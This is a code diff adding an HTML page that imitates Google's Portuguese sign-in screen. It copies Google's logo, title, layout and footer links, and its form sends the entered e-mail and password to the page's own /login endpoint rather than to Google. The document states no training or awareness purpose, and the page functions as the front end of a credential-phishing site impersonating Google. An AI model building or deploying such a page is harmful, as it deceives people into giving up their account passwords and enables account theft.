@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Google Sign-In</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f2f3f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background-color: white;
+      width: 720px;
+      border-radius: 28px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+      display: flex;
+      padding: 40px;
+    }
+
+    .left {
+      flex: 1;
+    }
+
+    .left img {
+      width: 74px;
+      margin-bottom: 20px;
+    }
+
+    .left h1 {
+      font-size: 24px;
+      margin-bottom: 8px;
+    }
+
+    .left p {
+      font-size: 16px;
+      color: #3c4043;
+    }
+
+    .right {
+      flex: 1;
+      padding-left: 40px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 400px;
+      padding: 14px;
+      font-size: 16px;
+      margin: 24px 0 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    .forgot-senha {
+      color: #1a73e8;
+      font-size: 14px;
+      cursor: pointer;
+      margin-bottom: 7px;
+      display: inline-block;
+    }
+
+    .info-text {
+      font-size: 14px;
+      color: #5f6368;
+    }
+
+    .info-descripition {
+      font-size: 13px;
+      color: #5f6368;
+    }
+
+    .info-text a {
+      color: #1a73e8;
+      text-decoration: none;
+      margin-left: 5px;
+    }
+
+    .footer-buttons {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 40px;
+    }
+
+    .footer-buttons a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 14px;
+    }
+
+    .next-button {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .bottom-links {
+      position: absolute;
+      bottom: 16px;
+      width: 100%;
+      text-align: center;
+      font-size: 12px;
+      color: #5f6368;
+    }
+
+    .bottom-links span {
+      margin: 0 12px;
+      cursor: pointer;
+    }
+
+    .language {
+      position: absolute;
+      bottom: 50px;
+      left: 20px;
+      font-size: 12px;
+      color: #5f6368;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <div class="left">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
+      <h1>Login</h1>
+      <p>Entre na sua conta Google</p>
+    </div>
+
+    <div class="right">
+      <form action="/login" method="post">
+        <input type="text" name="email" placeholder="E-mail ou telefone" required>
+        <input type="password" name="senha" placeholder="Senha" required>
+        <div class="forgot-senha">Esqueceu a senha?</div>
+        <div class="info-text">
+          Não é o seu computador? Use o modo Convidado para fazer login em modo privado.
+          <a href="#">Ler mais</a>
+        </div>
+        <div class="footer-buttons">
+          <a href="#">Criar conta</a>
+          <button class="next-button" type="submit">Entrar</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="language">Brasil (PT-Br)</div>
+  <div class="bottom-links">
+    <span>Ajuda</span>
+    <span>Privacidade</span>
+    <span>Termos</span>
+  </div>
+</body>
+</html>
